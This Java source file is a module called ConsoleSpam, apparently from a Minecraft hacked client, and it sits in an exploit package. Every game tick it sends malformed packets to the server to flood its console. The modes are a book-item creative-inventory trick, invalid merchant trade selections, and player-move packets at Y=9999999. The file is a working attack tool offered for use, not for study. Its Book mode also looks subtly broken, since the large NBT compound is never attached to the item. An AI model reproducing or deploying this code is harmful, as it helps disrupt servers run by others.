package coffee.client.feature.module.impl.exploit;

import coffee.client.feature.config.EnumSetting;
import coffee.client.feature.module.Module;
import coffee.client.feature.module.ModuleType;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.*;

public class ConsoleSpam extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Move).name("Mode").description("How to exploit").get());

    public ConsoleSpam() {
        super("ConsoleSpammer", "Spam the console of the server you're on", ModuleType.EXPLOIT);
    }

    @Override
    public void tick() {
        switch (mode.getValue()) {
            case Book -> {
                if (!client.player.getInventory().getStack(36).getItem().equals(Items.KNOWLEDGE_BOOK)) {
                    ItemStack consolespammer = new ItemStack(Items.KNOWLEDGE_BOOK, 1);
                    NbtCompound compound = new NbtCompound();
                    for (int i = 0; i < 25; i++) {
                        compound.put("tag", NbtString.of("__________".repeat(50)));
                    }
                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, consolespammer));
                }
                int s = client.player.getInventory().selectedSlot;
                client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(0));
                client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(s));
            }

            case Merchant -> {
                for (int i = 0; i < 5; i++)
                    client.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(-1));
            }

            case Move -> {
                for (int i = 0; i < 4; i++)
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(), 9999999, client.player.getZ(), false));
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode {
        Book, Merchant, Move
    }
}
